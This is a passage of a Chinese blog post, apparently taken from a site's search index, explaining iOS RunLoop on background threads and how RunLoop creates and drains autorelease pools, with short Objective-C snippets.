2.子线程需要开启RunLoop</span></span><br><span class="line">        [[<span class="built_in">NSRunLoop</span> currentRunLoop]run];</span><br><span class="line">        <span class="built_in">CFRelease</span>(observer);</span><br><span class="line">    &#125;</span><br><span class="line">    - (<span class="keyword">IBAction</span>)btnClick:(<span class="type">id</span>)sender &#123;</span><br><span class="line">        [<span class="keyword">self</span> performSelector:<span class="keyword">@selector</span>(test) onThread:<span class="keyword">self</span>.thread withObject:<span class="literal">nil</span> waitUntilDone:<span class="literal">NO</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    -(<span class="type">void</span>)test</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;%@&quot;</span>,[<span class="built_in">NSThread</span> currentThread]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">@end</span></span><br></pre></td></tr></table></figure><h4 id="注意：创建子线程相关的RunLoop，在子线程中创建即可，并且RunLoop中要至少有一个Timer-或-一个Source-保证RunLoop不会因为空转而退出，因此在创建的时候直接加入，如果没有加入Timer或者Source，或者只加入一个监听者，运行程序会崩溃"><a href="#注意：创建子线程相关的RunLoop，在子线程中创建即可，并且RunLoop中要至少有一个Timer-或-一个Source-保证RunLoop不会因为空转而退出，因此在创建的时候直接加入，如果没有加入Timer或者Source，或者只加入一个监听者，运行程序会崩溃" class="headerlink" title="注意：创建子线程相关的RunLoop，在子线程中创建即可，并且RunLoop中要至少有一个Timer 或 一个Source 保证RunLoop不会因为空转而退出，因此在创建的时候直接加入，如果没有加入Timer或者Source，或者只加入一个监听者，运行程序会崩溃"></a>注意：创建子线程相关的RunLoop，在子线程中创建即可，并且RunLoop中要至少有一个Timer 或 一个Source 保证RunLoop不会因为空转而退出，因此在创建的时候直接加入，如果没有加入Timer或者Source，或者只加入一个监听者，运行程序会崩溃</h4><h3 id="2-自动释放池"><a href="#2-自动释放池" class="headerlink" title="2. 自动释放池"></a>2. 自动释放池</h3><p>Timer和Source也是一些变量，需要占用一部分存储空间，所以要释放掉，如果不释放掉，就会一直积累，占用的内存也就越来越大，这显然不是我们想要的。<br> #### 那么什么时候释放，怎么释放?<br> RunLoop内部有一个自动释放池，当RunLoop开启时，就会自动创建一个自动释放池，当RunLoop在休息之前会释放掉自动释放池的东西，然后重新创建一个新的空的自动释放池，当RunLoop被唤醒重新开始跑圈时，Timer,Source等新的事件就会放到新的自动释放池中，当RunLoop退出的时候也会被释放。 ##### 注意：只有主线程的RunLoop会默认启动。也就意味着会自动创建自动释放池，子线程需要在线程调度方法中手动添加自动释放池。<br><figure class="highlight obj-c"><figcaption><span>obj-c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@autorelease&#123;  </span><br><span class="line">          <span class="comment">// 执行代码 </span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 底层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iOS </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
